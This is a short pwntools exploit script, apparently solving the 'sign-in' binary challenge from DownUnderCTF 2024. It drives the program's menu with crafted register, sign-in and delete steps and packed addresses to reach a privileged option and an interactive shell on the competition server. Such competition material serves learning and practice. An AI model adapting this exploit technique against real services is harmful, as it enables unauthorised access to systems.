from pwn import *

gs = '''
break *sign_in+172
continue
'''

elf = context.binary = ELF("./sign-in")

def start():
    if args.REMOTE:
        return remote("2024.ductf.dev", 30022)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()


io.sendlineafter("> ", b"1")
io.sendafter(": ", "test1")
io.sendafter(": ", p64(0x402eb8))

io.sendlineafter("> ", b"2")
io.sendafter(": ", "test1")
io.sendafter(": ", p64(0x402eb8))

io.sendlineafter("> ", b"3")

io.sendlineafter("> ", b"1")
io.sendafter(": ", "test2")
io.sendafter(": ", "test2")

io.sendlineafter("> ", b"2")
io.sendafter(": ", p64(0))
io.sendafter(": ", p64(0))

io.sendlineafter("> ", b"4")

io.interactive()